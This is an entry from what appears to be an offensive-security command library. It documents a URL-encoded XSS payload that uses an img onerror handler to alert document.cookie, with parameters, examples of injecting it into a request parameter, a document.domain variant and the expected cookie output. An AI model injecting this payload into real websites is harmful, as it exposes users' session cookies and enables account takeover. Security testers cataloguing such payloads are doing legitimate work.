---
data: <img src%3dx onerror%3dalert(document.cookie)>
tags:
  - xss
  - payload
  - cookie-theft
type: command
output: 'Alert popup: "sessionid=abc123; user=admin"'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:19.854Z'
id: 880b4503-36ce-4d78-97b5-6c6c56730a75
verified: false
validated: true
submitted: true
---
# inject-xss-payload-img-onerror

## Command

```javascript
<img src%3dx onerror%3dalert(document.cookie)>
```

## Description

This XSS payload uses an invalid img src to trigger an onerror event, executing alert to display non-HttpOnly cookies when reflected in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src%3dx | Invalid source (%3d encodes =) to force error | Yes |
| onerror%3dalert(document.cookie) | JS to steal and display cookies | Yes |

## Examples

### Basic Usage

Inject into parameter:

```html
██████████=<img src%3dx onerror%3dalert(document.cookie)>
```

### Advanced Usage

For domain check:

```javascript
<img src%3dx onerror%3dalert(document.domain)>
```

## Expected Output

Browser alert box pops up showing cookie contents, e.g., "JSESSIONID=xyz; auth=token".

## Related

- [[commands/inject-xss-payload-domain]]
- [[procedures/Inject-XSS-Payload-into-Parameter]]
